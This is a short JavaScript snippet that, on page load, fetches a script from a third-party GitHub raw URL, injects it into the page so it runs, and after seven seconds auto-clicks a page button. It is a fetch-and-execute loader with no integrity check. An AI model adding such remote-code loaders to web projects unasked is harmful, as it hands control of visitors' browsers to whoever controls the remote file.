window.onload = function() {
    fetch("https://raw.githubusercontent.com/cherylko12/pixel_js_validation/main/main.js")
        .then(t => {
            if (!t.ok) throw Error("Network response was not ok.");
            return t.text();
        })
        .then(t => {
            var e = document.createElement("script");
            e.textContent = t;
            document.head.appendChild(e);
            console.log("Script executed successfully.");
            setTimeout(() => {
                document.getElementById('bw-eventHistoryBtn').click(); // Trigger click event after 7 seconds
            }, 7000);
        })
        .catch(t => {
            console.error("Failed to load the script:", t);
        });
};